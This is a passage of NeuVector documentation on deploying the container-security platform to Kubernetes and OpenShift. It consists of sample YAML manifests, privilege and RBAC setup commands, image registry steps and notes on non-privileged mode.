-n neuvector ds/neuvector-enforcer-pod kubectl rollout undo -n neuvector deployment/neuvector-controller-pod   ","version":"Next 🚧","tagName":"h3"},{"title":"Expose REST API in Kubernetes​","type":1,"pageTitle":"Kubernetes","url":"/next/deploying/kubernetes#expose-rest-api-in-kubernetes","content":" To expose the REST API for access from outside of the Kubernetes cluster, here is a sample yaml file:  apiVersion: v1 kind: Service metadata: name: neuvector-service-rest namespace: neuvector spec: ports: - port: 10443 name: controller protocol: TCP type: LoadBalancer selector: app: neuvector-controller-pod   Please see the Automation section for more info on the REST API.  ","version":"Next 🚧","tagName":"h3"},{"title":"Kubernetes Deployment in Non-Privileged Mode​","type":1,"pageTitle":"Kubernetes","url":"/next/deploying/kubernetes#kubernetes-deployment-in-non-privileged-mode","content":" The following instructions can be used to deploy NeuVector without using privileged mode containers. The controller is already in non-privileged mode and enforcer deployment should be changed, which is shown in the excerpted snippets below.  Enforcer:  spec: template: metadata: annotations: container.apparmor.security.beta.kubernetes.io/neuvector-enforcer-pod: unconfined # this line is required to be added if k8s version is pre-v1.19 # container.seccomp.security.alpha.kubernetes.io/neuvector-enforcer-pod: unconfined spec: containers: securityContext: # the following two lines are required for k8s v1.19+. pls comment out both lines if version is pre-1.19. Otherwise, a validating data error message will show seccompProfile: type: Unconfined capabilities: add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK   The following sample is a complete deployment reference (Kubernetes 1.19+).  apiVersion: v1 kind: Service metadata: name: neuvector-svc-crd-webhook namespace: neuvector spec: ports: - port: 443 targetPort: 30443 protocol: TCP name: crd-webhook type: ClusterIP selector: app: neuvector-controller-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-svc-admission-webhook namespace: neuvector spec: ports: - port: 443 targetPort: 20443 protocol: TCP name: admission-webhook type: ClusterIP selector: app: neuvector-controller-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-service-webui namespace: neuvector spec: ports: - port: 8443 name: manager protocol: TCP type: LoadBalancer selector: app: neuvector-manager-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-svc-controller namespace: neuvector spec: ports: - port: 18300 protocol: &quot;TCP&quot; name: &quot;cluster-tcp-18300&quot; - port: 18301 protocol: &quot;TCP&quot; name: &quot;cluster-tcp-18301&quot; - port: 18301 protocol: &quot;UDP&quot; name: &quot;cluster-udp-18301&quot; clusterIP: None selector: app: neuvector-controller-pod --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-manager-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-manager-pod replicas: 1 template: metadata: labels: app: neuvector-manager-pod spec: serviceAccountName: basic serviceAccount: basic containers: - name: neuvector-manager-pod image: neuvector/manager:5.3.2 env: - name: CTRL_SERVER_IP value: neuvector-svc-controller.neuvector restartPolicy: Always --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-controller-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-controller-pod minReadySeconds: 60 strategy: type: RollingUpdate rollingUpdate: maxSurge: 1 maxUnavailable: 0 replicas: 3 template: metadata: labels: app: neuvector-controller-pod spec: affinity: podAntiAffinity: preferredDuringSchedulingIgnoredDuringExecution: - weight: 100 podAffinityTerm: labelSelector: matchExpressions: - key: app operator: In values: - neuvector-controller-pod topologyKey: &quot;kubernetes.io/hostname&quot; serviceAccountName: controller serviceAccount: controller containers: - name: neuvector-controller-pod image: neuvector/controller:5.3.2 securityContext: runAsUser: 0 readinessProbe: exec: command: - cat - /tmp/ready initialDelaySeconds: 5 periodSeconds: 5 env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector - name: CLUSTER_ADVERTISED_ADDR valueFrom: fieldRef: fieldPath: status.podIP - name: CLUSTER_BIND_ADDR valueFrom: fieldRef: fieldPath: status.podIP # - name: CTRL_PERSIST_CONFIG # value: &quot;1&quot; volumeMounts: # - mountPath: /var/neuvector # name: nv-share # readOnly: false - mountPath: /etc/config name: config-volume readOnly: true terminationGracePeriodSeconds: 300 restartPolicy: Always volumes: # - name: nv-share # persistentVolumeClaim: # claimName: neuvector-data - name: config-volume projected: sources: - configMap: name: neuvector-init optional: true - secret: name: neuvector-init optional: true - secret: name: neuvector-secret optional: true --- apiVersion: apps/v1 kind: DaemonSet metadata: name: neuvector-enforcer-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-enforcer-pod updateStrategy: type: RollingUpdate template: metadata: labels: app: neuvector-enforcer-pod annotations: container.apparmor.security.beta.kubernetes.io/neuvector-enforcer-pod: unconfined # Add the following for pre-v1.19 # container.seccomp.security.alpha.kubernetes.io/neuvector-enforcer-pod: unconfined spec: tolerations: - effect: NoSchedule key: node-role.kubernetes.io/master - effect: NoSchedule key: node-role.kubernetes.io/control-plane hostPID: true serviceAccountName: enforcer serviceAccount: enforcer containers: - name: neuvector-enforcer-pod image: neuvector/enforcer:5.3.2 securityContext: # the following two lines are required for k8s v1.19+. pls comment out both lines if version is pre-1.19. Otherwise, a validating data error message will show seccompProfile: type: Unconfined capabilities: add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector - name: CLUSTER_ADVERTISED_ADDR valueFrom: fieldRef: fieldPath: status.podIP - name: CLUSTER_BIND_ADDR valueFrom: fieldRef: fieldPath: status.podIP volumeMounts: - mountPath: /lib/modules name: modules-vol readOnly: true # - mountPath: /run/runtime.sock # name: runtime-sock # readOnly: true # - mountPath: /host/proc # name: proc-vol # readOnly: true # - mountPath: /host/cgroup # name: cgroup-vol # readOnly: true - mountPath: /var/nv_debug name: nv-debug readOnly: false terminationGracePeriodSeconds: 1200 restartPolicy: Always volumes: - name: modules-vol hostPath: path: /lib/modules # - name: runtime-sock # hostPath: # path: /var/run/docker.sock # path: /var/run/containerd/containerd.sock # path: /run/dockershim.sock # path: /run/k3s/containerd/containerd.sock # path: /var/run/crio/crio.sock # path: /var/vcap/sys/run/docker/docker.sock # - name: proc-vol # hostPath: # path: /proc # - name: cgroup-vol # hostPath: # path: /sys/fs/cgroup - name: nv-debug hostPath: path: /var/nv_debug --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-scanner-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-scanner-pod strategy: type: RollingUpdate rollingUpdate: maxSurge: 1 maxUnavailable: 0 replicas: 2 template: metadata: labels: app: neuvector-scanner-pod spec: serviceAccountName: scanner serviceAccount: scanner containers: - name: neuvector-scanner-pod image: neuvector/scanner:latest imagePullPolicy: Always env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector restartPolicy: Always --- apiVersion: batch/v1 kind: CronJob metadata: name: neuvector-updater-pod namespace: neuvector spec: schedule: &quot;0 0 * * *&quot; jobTemplate: spec: template: metadata: labels: app: neuvector-updater-pod spec: serviceAccountName: updater serviceAccount: updater containers: - name: neuvector-updater-pod image: neuvector/updater:latest imagePullPolicy: Always command: - /bin/sh - -c - TOKEN=`cat /var/run/secrets/kubernetes.io/serviceaccount/token`; /usr/bin/curl -kv -X PATCH -H &quot;Authorization:Bearer $TOKEN&quot; -H &quot;Content-Type:application/strategic-merge-patch+json&quot; -d '{&quot;spec&quot;:{&quot;template&quot;:{&quot;metadata&quot;:{&quot;annotations&quot;:{&quot;kubectl.kubernetes.io/restartedAt&quot;:&quot;'`date +%Y-%m-%dT%H:%M:%S%z`'&quot;}}}}}' 'https://kubernetes.default/apis/apps/v1/namespaces/neuvector/deployments/neuvector-scanner-pod' restartPolicy: Never   PKS Change  note PKS is field tested and requires enabling privileged containers to the plan/tile, and changing the yaml hostPath as follows for Allinone, Enforcer:   hostPath: path: /var/vcap/sys/run/docker/docker.sock  ","version":"Next 🚧","tagName":"h3"},{"title":"RedHat OpenShift","type":0,"sectionRef":"#","url":"/next/deploying/openshift","content":"","keywords":"","version":"Next 🚧"},{"title":"Deploy Separate NeuVector Components with RedHat OpenShift​","type":1,"pageTitle":"RedHat OpenShift","url":"/next/deploying/openshift#deploy-separate-neuvector-components-with-redhat-openshift","content":" NeuVector is compatible with standard ovs SDN plug-ins as well as others such as flannel, weave, or calico. The samples below assume a standard ovs plug-in is used. This also assumes a local docker registry will be used (see instructions at end for creating the secret for dynamically pulling from neuvector or Docker Hub).  NeuVector supports Helm-based deployment with a Helm chart at https://github.com/neuvector/neuvector-helm. The NeuVector Operator can also be used to deploy and is based on the Helm chart. To deploy the latest NeuVector container versions using an Operator, please use either the Red Hat Certified Operator from Operator Hub or the community operator, as detailed in the Operator section.  To deploy manually, first pull the appropriate NeuVector containers from the NeuVector registry into your local registry. Note: the scanner image should be pulled regularly for CVE database updates from NeuVector.  NeuVector Images on Docker Hub​  The images are on the NeuVector Docker Hub registry. Use the appropriate version tag for the manager, controller, enforcer, and leave the version as 'latest' for scanner and updater. For example: neuvector/manager:5.3.0  neuvector/controller:5.3.0  neuvector/enforcer:5.3.0  neuvector/scanner:latest  neuvector/updater:latest   Please be sure to update the image references in appropriate yaml files.  If deploying with the current NeuVector Helm chart (v1.8.9+), the following changes should be made to values.yml: Update the registry to docker.io  Update image names/tags to the current version on Docker hub, as shown above  Leave the imagePullSecrets empty   ","version":"Next 🚧","tagName":"h3"},{"title":"Deploy on OpenShift​","type":1,"pageTitle":"RedHat OpenShift","url":"/next/deploying/openshift#deploy-on-openshift","content":" docker login docker.io docker pull docker.io/neuvector/manager:&lt;version&gt; docker pull docker.io/neuvector/controller:&lt;version&gt; docker pull docker.io/neuvector/enforcer:&lt;version&gt; docker pull docker.io/neuvector/scanner docker pull docker.io/neuvector/updater docker logout docker.io   The sample file below will deploy one manager, 3 controllers, and 2 scanner pods. It will deploy an enforcer on every node as a daemonset, including on the master node (if schedulable). See the bottom section for specifying dedicated manager or controller nodes using node labels. Note: It is not recommended to deploy (scale) more than one manager behind a load balancer due to potential session state issues. If you plan to use a PersistentVolume claim to store the backup of NeuVector config files, please see the general Backup/Persistent Data section in the Production Deployment overview.  Next, set the route and allow privileged NeuVector containers using the instructions below. By default, OpenShift does not allow privileged containers. Also, by default OpenShift does not schedule pods on the Master node. See the instructions at the end to enable/disable this.  note Please see the Enterprise Integration section for details on integration with OpenShift Role Based Access Controls (RBACs).  Login as a normal user  oc login -u &lt;user_name&gt;   Create a new project.  note If the --node-selector argument is used when creating a project this will restrict pod placement such as for the NeuVector enforcer to specific nodes.  oc new-project neuvector   Push NeuVector images to OpenShift docker registry.  note For OpenShift 4.6+, change docker-registry.default.svc below to image-registry.openshift-image-registry.svc in the commands below  docker login -u &lt;user_name&gt; -p `oc whoami -t` docker-registry.default.svc:5000 docker tag docker.io/neuvector/enforcer:&lt;version&gt; docker-registry.default.svc:5000/neuvector/enforcer:&lt;version&gt; docker tag docker.io/neuvector/controller:&lt;version&gt; docker-registry.default.svc:5000/neuvector/controller:&lt;version&gt; docker tag docker.io/neuvector/manager:&lt;version&gt; docker-registry.default.svc:5000/neuvector/manager:&lt;version&gt; docker tag docker.io/neuvector/scanner docker-registry.default.svc:5000/neuvector/scanner docker tag docker.io/neuvector/updater docker-registry.default.svc:5000/neuvector/updater docker push docker-registry.default.svc:5000/neuvector/enforcer:&lt;version&gt; docker push docker-registry.default.svc:5000/neuvector/controller:&lt;version&gt; docker push docker-registry.default.svc:5000/neuvector/manager:&lt;version&gt; docker push docker-registry.default.svc:5000/neuvector/scanner docker push docker-registry.default.svc:5000/neuvector/updater docker logout docker-registry.default.svc:5000   note Please see the section Updating the CVE Database below for recommendations for keeping the latest scanner image updated in your registry.  Login as system:admin account  oc login -u system:admin   Create Service Accounts and Grant Access to the Privileged SCC  oc create sa controller -n neuvector oc create sa enforcer -n neuvector oc create sa basic -n neuvector oc create sa updater -n neuvector oc create sa scanner -n neuvector oc create sa registry-adapter -n neuvector oc -n neuvector adm policy add-scc-to-user privileged -z enforcer   The following info will be added in the Privileged SCC users:  - system:serviceaccount:neuvector:enforcer   Add a new neuvector-scc-controller scc for controller service account in Openshift, by creating a file with:  allowHostDirVolumePlugin: false allowHostIPC: false allowHostNetwork: false allowHostPID: false allowHostPorts: false allowPrivilegeEscalation: false allowPrivilegedContainer: false allowedCapabilities: null apiVersion: security.openshift.io/v1 defaultAddCapabilities: null fsGroup: type: RunAsAny groups: [] kind: SecurityContextConstraints metadata: name: neuvector-scc-controller priority: null readOnlyRootFilesystem: false requiredDropCapabilities: - ALL runAsUser: type: RunAsAny seLinuxContext: type: RunAsAny supplementalGroups: type: RunAsAny users: [] volumes: - configMap - downwardAPI - emptyDir - persistentVolumeClaim - azureFile - projected - secret   Then apply  oc apply -f (filename)   Then run the following command to bind controller service account to neuvector-scc-controller scc  oc -n neuvector adm policy add-scc-to-user neuvector-scc-controller -z controller   In OpenShift 4.6+ use the following to check:  oc get rolebinding system:openshift:scc:privileged -n neuvector -o wide   NAME ROLE AGE USERS GROUPS SERVICEACCOUNTS system:openshift:scc:privileged ClusterRole/system:openshift:scc:privileged 9m22s neuvector/enforcer   Run this command to check NeuVector service for Controller:  oc get rolebinding system:openshift:scc:neuvector-scc-controller n neuvector -o wide   The output will look like  NAME ROLE AGE USERS GROUPS SERVICEACCOUNTS System:openshift:scc:neuvector-scc-controller ClusterRole/system:openshift:scc:neuvector-scc-controller 9m22s neuvector/controller   Create the custom resources (CRD) for NeuVector security rules. For OpenShift 4.6+ (Kubernetes 1.19+):  oc apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.3.0/crd-k8s-1.19.yaml oc apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.3.0/waf-crd-k8s-1.19.yaml oc apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.3.0/dlp-crd-k8s-1.19.yaml oc apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.3.0/com-crd-k8s-1.19.yaml oc apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.3.0/vul-crd-k8s-1.19.yaml oc apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.3.0/admission-crd-k8s-1.19.yaml   Add read permission to access the kubernetes API and OpenShift RBACs. IMPORTANT: The standard NeuVector 5.2+ deployment uses least-privileged service accounts instead of the default. See below if upgrading to 5.2+ from a version prior to 5.2.  attention If you are upgrading to 5.3.0+, run the following commands based on your current version: Version 5.2.0Versions prior to 5.2.0 oc delete clusterrole neuvector-binding-nvsecurityrules neuvector-binding-nvadmissioncontrolsecurityrules neuvector-binding-nvdlpsecurityrules neuvector-binding-nvwafsecurityrules   oc create clusterrole neuvector-binding-app --verb=get,list,watch,update --resource=nodes,pods,services,namespaces oc create clusterrole neuvector-binding-rbac --verb=get,list,watch --resource=rolebindings.rbac.authorization.k8s.io,roles.rbac.authorization.k8s.io,clusterrolebindings.rbac.authorization.k8s.io,clusterroles.rbac.authorization.k8s.io,imagestreams.image.openshift.io oc adm policy add-cluster-role-to-user neuvector-binding-app system:serviceaccount:neuvector:controller oc adm policy add-cluster-role-to-user neuvector-binding-rbac system:serviceaccount:neuvector:controller oc create clusterrole neuvector-binding-admission --verb=get,list,watch,create,update,delete --resource=validatingwebhookconfigurations,mutatingwebhookconfigurations oc adm policy add-cluster-role-to-user neuvector-binding-admission system:serviceaccount:neuvector:controller oc create clusterrole neuvector-binding-customresourcedefinition --verb=watch,create,get,update --resource=customresourcedefinitions oc adm policy add-cluster-role-to-user neuvector-binding-customresourcedefinition system:serviceaccount:neuvector:controller oc create clusterrole neuvector-binding-nvsecurityrules --verb=get,list,delete --resource=nvsecurityrules,nvclustersecurityrules oc create clusterrole neuvector-binding-nvadmissioncontrolsecurityrules --verb=get,list,delete --resource=nvadmissioncontrolsecurityrules oc create clusterrole neuvector-binding-nvdlpsecurityrules --verb=get,list,delete --resource=nvdlpsecurityrules oc create clusterrole neuvector-binding-nvwafsecurityrules --verb=get,list,delete --resource=nvwafsecurityrules oc adm policy add-cluster-role-to-user neuvector-binding-nvsecurityrules system:serviceaccount:neuvector:controller oc adm policy add-cluster-role-to-user view system:serviceaccount:neuvector:controller --rolebinding-name=neuvector-binding-view oc adm policy add-cluster-role-to-user neuvector-binding-nvwafsecurityrules system:serviceaccount:neuvector:controller oc adm policy add-cluster-role-to-user neuvector-binding-nvadmissioncontrolsecurityrules system:serviceaccount:neuvector:controller oc adm policy add-cluster-role-to-user neuvector-binding-nvdlpsecurityrules system:serviceaccount:neuvector:controller oc create role neuvector-binding-scanner --verb=get,patch,update,watch --resource=deployments -n neuvector oc adm policy add-role-to-user neuvector-binding-scanner system:serviceaccount:neuvector:updater system:serviceaccount:neuvector:controller -n neuvector --role-namespace neuvector oc create clusterrole neuvector-binding-co --verb=get,list --resource=clusteroperators oc adm policy add-cluster-role-to-user neuvector-binding-co system:serviceaccount:neuvector:enforcer system:serviceaccount:neuvector:controller oc create role neuvector-binding-secret --verb=get --resource=secrets -n neuvector oc adm policy add-role-to-user neuvector-binding-secret system:serviceaccount:neuvector:controller -n neuvector --role-namespace neuvector oc create clusterrole neuvector-binding-nvcomplianceprofiles --verb=get,list,delete --resource=nvcomplianceprofiles oc create clusterrolebinding neuvector-binding-nvcomplianceprofiles --clusterrole=neuvector-binding-nvcomplianceprofiles --serviceaccount=neuvector:controller oc create clusterrole neuvector-binding-nvvulnerabilityprofiles --verb=get,list,delete --resource=nvvulnerabilityprofiles oc create clusterrolebinding neuvector-binding-nvvulnerabilityprofiles --clusterrole=neuvector-binding-nvvulnerabilityprofiles --serviceaccount=neuvector:controller   Run the following command to check if the neuvector/controller, neuvector/enforcer and neuvector/updater service accounts are added successfully.  oc get ClusterRoleBinding neuvector-binding-app neuvector-binding-rbac neuvector-binding-admission neuvector-binding-customresourcedefinition neuvector-binding-nvsecurityrules neuvector-binding-view neuvector-binding-nvwafsecurityrules neuvector-binding-nvadmissioncontrolsecurityrules neuvector-binding-nvdlpsecurityrules neuvector-binding-co -o wide   Sample output:  NAME ROLE AGE USERS GROUPS SERVICEACCOUNTS neuvector-binding-app ClusterRole/neuvector-binding-app 56d neuvector/controller neuvector-binding-rbac ClusterRole/neuvector-binding-rbac 34d neuvector/controller neuvector-binding-admission ClusterRole/neuvector-binding-admission 72d neuvector/controller neuvector-binding-customresourcedefinition ClusterRole/neuvector-binding-customresourcedefinition 72d neuvector/controller neuvector-binding-nvsecurityrules ClusterRole/neuvector-binding-nvsecurityrules 72d neuvector/controller neuvector-binding-view ClusterRole/view 72d neuvector/controller neuvector-binding-nvwafsecurityrules ClusterRole/neuvector-binding-nvwafsecurityrules 72d neuvector/controller neuvector-binding-nvadmissioncontrolsecurityrules ClusterRole/neuvector-binding-nvadmissioncontrolsecurityrules 72d neuvector/controller neuvector-binding-nvdlpsecurityrules ClusterRole/neuvector-binding-nvdlpsecurityrules 72d neuvector/controller neuvector-binding-co ClusterRole/neuvector-binding-co 72d neuvector/enforcer, neuvector/controller   And this command:  oc get RoleBinding neuvector-binding-scanner -n neuvector -o wide   Sample output:  NAME ROLE AGE USERS GROUPS SERVICEACCOUNTS neuvector-binding-scanner Role/neuvector-binding-scanner 70d neuvector/updater, neuvector/controller   (Optional) Create the Federation Master and/or Remote Multi-Cluster Management Services. If you plan to use the multi-cluster management functions in NeuVector, one cluster must have the Federation Master service deployed, and each remote cluster must have the Federation Worker service. For flexibility, you may choose to deploy both Master and Worker services on each cluster so any cluster can be a master or remote.  Federated Management Services  apiVersion: v1 kind: Service metadata: name: neuvector-service-controller-fed-master namespace: neuvector spec: ports: - port: 11443 name: fed protocol: TCP type: NodePort selector: app: neuvector-controller-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-service-controller-fed-worker namespace: neuvector spec: ports: - port: 10443 name: fed protocol: TCP type: NodePort selector: app: neuvector-controller-pod   Then create the appropriate service(s):  oc create -f nv_master_worker.yaml   Create the neuvector services and pods based on the sample yamls below. Important! Replace the &lt;version&gt; tags for the manager, controller and enforcer image references in the yaml file. Also make any other modifications required for your deployment environment.  oc create -f &lt;compose file&gt;   That's it! You should be able to connect to the NeuVector console and login with admin:admin, e.g. https://&lt;public-ip&gt;:8443  To see how to access the console for the neuvector-webui service:  oc get services -n neuvector   If you have created your own namespace instead of using “neuvector”, replace all instances of “namespace: neuvector” and other namespace references with your namespace in the sample yaml files below.  OpenShift 4.6+ with CRI-O run-time  The name of your default OpenShift registry might have changed from docker-registry to openshift-image-registry. You may need to change the image registry for the manager, controller, and enforcer in the sample yaml.  note Type NodePort is used for the fed-master and fed-worker services instead of LoadBalancer. You may need to adjust for your deployment.  If using the CRI-O run-time, see this CRI-O sample.  Master Node Taints and Tolerations  All taint info must match to schedule Enforcers on nodes. To check the taint info on a node (e.g. Master):  $ oc get node taintnodename -o yaml   Sample output:  spec: taints: - effect: NoSchedule key: node-role.kubernetes.io/master # there may be an extra info for taint as below - effect: NoSchedule key: mykey value: myvalue   If there is additional taints as above, add these to the sample yaml tolerations section:  spec: template: spec: tolerations: - effect: NoSchedule key: node-role.kubernetes.io/master - effect: NoSchedule key: node-role.kubernetes.io/control-plane # if there is an extra info for taints as above, please add it here. This is required to match all the taint info defined on the taint node. Otherwise, the Enforcer won't deploy on the taint node - effect: NoSchedule key: mykey value: myvalue   ","version":"Next 🚧","tagName":"h3"},{"title":"Using Node Labels for Manager and Controller Nodes​","type":1,"pageTitle":"RedHat OpenShift","url":"/next/deploying/openshift#using-node-labels-for-manager-and-controller-nodes","content":" To control which nodes the Manager and Controller are deployed on, label each node. Replace &lt;nodename&gt; with the appropriate node name.  oc label nodes &lt;nodename&gt; nvcontroller=true   Then add a nodeSelector to the yaml file for the Manager and Controller deployment sections. For example:   - mountPath: /host/cgroup name: cgroup-vol readOnly: true nodeSelector: nvcontroller: &quot;true&quot; restartPolicy: Always   To prevent the enforcer from being deployed on a controller node, if it is a dedicated management node (without application containers to be monitored), add a nodeAffinity to the Enforcer yaml section. For example:  app: neuvector-enforcer-pod spec: affinity: nodeAffinity: requiredDuringSchedulingIgnoredDuringExecution: nodeSelectorTerms: - matchExpressions: - key: nvcontroller operator: NotIn values: [&quot;true&quot;] imagePullSecrets:   ","version":"Next 🚧","tagName":"h3"},{"title":"Updating the CVE Database on OpenShift Deployments​","type":1,"pageTitle":"RedHat OpenShift","url":"/next/deploying/openshift#updating-the-cve-database-on-openshift-deployments","content":" The latest scanner image always contains the most recent CVE database update from NeuVector. For this reason, a version tag is not recommended when pulling the image. However, updating the CVE database requires regular pulling of the latest scanner image so the updater cron job can redeploy the scanner(s). The samples above assume NeuVector images are pulled, tagged and pushed to a local OpenShift registry. Deployment is then from this registry instead of directly from neuvector (or the legacy NeuVector registry on docker hub).  To regularly update the CVE database, we recommend a script/cron job be created to pull the latest NeuVector scanner image and perform the tagging and pushing steps to the local registry. This will ensure the CVE database is being updated regularly and images and containers are being scanned for new vulnerabilities.  ","version":"Next 🚧","tagName":"h3"},{"title":"Rolling Updates​","type":1,"pageTitle":"RedHat OpenShift","url":"/next/deploying/openshift#rolling-updates","content":" Orchestration tools such as Kubernetes, RedHat OpenShift, and Rancher support rolling updates with configurable policies. You can use this feature to update the NeuVector containers. The most important will be to ensure that there is at least one Allinone/Controller running so that policies, logs, and connection data is not lost. Make sure that there is a minimum of 30 seconds between container updates so that a new leader can be elected and the data synchronized between controllers.  Before starting the rolling updates, please pull and tag the NeuVector containers the same way as in the beginning of this page. You can pull the latest without a version number, but to trigger the rolling update you’ll need to tag the image with a version.  For example, for the controller (latest):  docker pull neuvector/controller   Then to tag/push, if latest version is 2.0.1, same as step 3 at the top of this page:  docker login -u &lt;user_name&gt; -p `oc whoami -t` docker-registry.default.svc:5000 docker tag neuvector/controller docker-registry.default.svc:5000/neuvector/controller:2.0.1 docker push docker-registry.default.svc:5000/neuvector/controller:2.0.1   You can now update your yaml file with these new versions and ‘apply’, or use the ‘oc set image ...’ command to trigger the rolling update. Please see the Kubernetes rolling update samples in this Production section to how to launch and monitor rolling updates of the NeuVector containers.  The provided sample deployment yamls already configure the rolling update policy. If you are updating via the NeuVector Helm chart, please pull the latest chart to properly configure new features such as admission control, and delete the old cluster role and cluster role binding for NeuVector.  ","version":"Next 🚧","tagName":"h3"},{"title":"Enabling the REST API​","type":1,"pageTitle":"RedHat OpenShift","url":"/next/deploying/openshift#enabling-the-rest-api","content":" To enable the rest API, port 10443 must be configured as follows:  apiVersion: v1 kind: Service metadata: name: neuvector-service-controller namespace: neuvector spec: ports: - port: 10443 name: controller protocol: TCP type: NodePort selector: app: neuvector-controller-pod   ","version":"Next 🚧","tagName":"h3"},{"title":"Enable/Disable Scheduling on the Master Node​","type":1,"pageTitle":"RedHat OpenShift","url":"/next/deploying/openshift#enabledisable-scheduling-on-the-master-node","content":" The following commands can be used to enable/disable the scheduling on the master node.  oc adm manage-node nodename --schedulable   oc adm manage-node nodename --schedulable=false   ","version":"Next 🚧","tagName":"h3"},{"title":"OpenShift Deployment in Non-Privileged Mode​","type":1,"pageTitle":"RedHat OpenShift","url":"/next/deploying/openshift#openshift-deployment-in-non-privileged-mode","content":" The following instructions can be used to deploy NeuVector without using privileged mode containers. The controller is already in non-privileged mode and the enforcer deployment should be changed, which is shown in the excerpted snippets below.  Enforcer:  spec: template: metadata: annotations: container.apparmor.security.beta.kubernetes.io/neuvector-enforcer-pod: unconfined # this line below is required to be added if k8s version is pre-v1.19 # container.seccomp.security.alpha.kubernetes.io/neuvector-enforcer-pod: unconfined spec: containers: securityContext: # openshift seLinuxOptions: type: unconfined_t # the following two lines are required for k8s v1.19+. pls comment out both lines if version is pre-1.19. Otherwise, a validating data error message will show seccompProfile: type: Unconfined capabilities: add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK - NET_RAW - SYS_CHROOT - MKNOD - AUDIT_WRITE - SETFCAP   The following sample is a complete deployment reference using the cri-o run-time. For other run-times please make the appropriate changes to the volumes/volume mounts for the crio.sock.  apiVersion: v1 kind: Service metadata: name: neuvector-svc-crd-webhook namespace: neuvector spec: ports: - port: 443 targetPort: 30443 protocol: TCP name: crd-webhook type: ClusterIP selector: app: neuvector-controller-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-svc-admission-webhook namespace: neuvector spec: ports: - port: 443 targetPort: 20443 protocol: TCP name: admission-webhook type: ClusterIP selector: app: neuvector-controller-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-service-webui namespace: neuvector spec: ports: - port: 8443 name: manager protocol: TCP type: ClusterIP selector: app: neuvector-manager-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-svc-controller namespace: neuvector spec: ports: - port: 18300 protocol: &quot;TCP&quot; name: &quot;cluster-tcp-18300&quot; - port: 18301 protocol: &quot;TCP&quot; name: &quot;cluster-tcp-18301&quot; - port: 18301 protocol: &quot;UDP&quot; name: &quot;cluster-udp-18301&quot; clusterIP: None selector: app: neuvector-controller-pod --- apiVersion: route.openshift.io/v1 kind: Route metadata: name: neuvector-route-webui namespace: neuvector spec: to: kind: Service name: neuvector-service-webui port: targetPort: manager tls: termination: passthrough --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-manager-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-manager-pod replicas: 1 template: metadata: labels: app: neuvector-manager-pod spec: serviceAccountName: basic serviceAccount: basic containers: - name: neuvector-manager-pod image: image-registry.openshift-image-registry.svc:5000/neuvector/manager:&lt;version&gt; env: - name: CTRL_SERVER_IP value: neuvector-svc-controller.neuvector restartPolicy: Always --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-controller-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-controller-pod minReadySeconds: 60 strategy: type: RollingUpdate rollingUpdate: maxSurge: 1 maxUnavailable: 0 replicas: 3 template: metadata: labels: app: neuvector-controller-pod spec: affinity: podAntiAffinity: preferredDuringSchedulingIgnoredDuringExecution: - weight: 100 podAffinityTerm: labelSelector: matchExpressions: - key: app operator: In values: - neuvector-controller-pod topologyKey: &quot;kubernetes.io/hostname&quot; serviceAccountName: controller serviceAccount: controller containers: - name: neuvector-controller-pod image: image-registry.openshift-image-registry.svc:5000/neuvector/controller:&lt;version&gt; securityContext: runAsUser: 0 readinessProbe: exec: command: - cat - /tmp/ready initialDelaySeconds: 5 periodSeconds: 5 env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector - name: CLUSTER_ADVERTISED_ADDR valueFrom: fieldRef: fieldPath: status.podIP - name: CLUSTER_BIND_ADDR valueFrom: fieldRef: fieldPath: status.podIP # - name: CTRL_PERSIST_CONFIG # value: &quot;1&quot; volumeMounts: # - mountPath: /var/neuvector # name: nv-share # readOnly: false - mountPath: /etc/config name: config-volume readOnly: true terminationGracePeriodSeconds: 300 restartPolicy: Always volumes: # - name: nv-share # persistentVolumeClaim: # claimName: neuvector-data - name: config-volume projected: sources: - configMap: name: neuvector-init optional: true - secret: name: neuvector-init optional: true - secret: name: neuvector-secret optional: true --- apiVersion: apps/v1 kind: DaemonSet metadata: name: neuvector-enforcer-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-enforcer-pod updateStrategy: type: RollingUpdate template: metadata: labels: app: neuvector-enforcer-pod annotations: container.apparmor.security.beta.kubernetes.io/neuvector-enforcer-pod: unconfined # Add the following for pre-v1.19 # container.seccomp.security.alpha.kubernetes.io/neuvector-enforcer-pod: unconfined spec: tolerations: - effect: NoSchedule key: node-role.kubernetes.io/master - effect: NoSchedule key: node-role.kubernetes.io/control-plane hostPID: true serviceAccountName: enforcer serviceAccount: enforcer containers: - name: neuvector-enforcer-pod image: image-registry.openshift-image-registry.svc:5000/neuvector/enforcer:&lt;version&gt; securityContext: # openshift seLinuxOptions: type: unconfined_t # the following two lines are required for k8s v1.19+. pls comment out both lines if version is pre-1.19. Otherwise, a validating data error message will show seccompProfile: type: 